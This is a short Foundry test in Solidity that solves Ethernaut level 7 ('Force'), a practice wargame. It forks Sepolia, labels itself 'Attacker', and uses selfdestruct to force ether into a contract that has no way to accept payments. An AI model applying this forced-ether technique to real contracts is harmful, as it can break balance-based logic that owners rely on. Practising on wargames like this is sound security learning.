// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/07-Force/Force.sol";

contract ContractTest is Test {
    Force level7 = Force(payable(0x9eD3Ea280180512155d7c584a735D1bB185B3103));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x9eD3Ea280180512155d7c584a735D1bB185B3103),
            "Ethernaut07"
        );
    }

    function testEthernaut07() public {
        assertEq(
            address(0x9eD3Ea280180512155d7c584a735D1bB185B3103).balance,
            0
        );
        selfdestruct(
            payable(address(0x9eD3Ea280180512155d7c584a735D1bB185B3103))
        );
    }

    receive() external payable {}
}
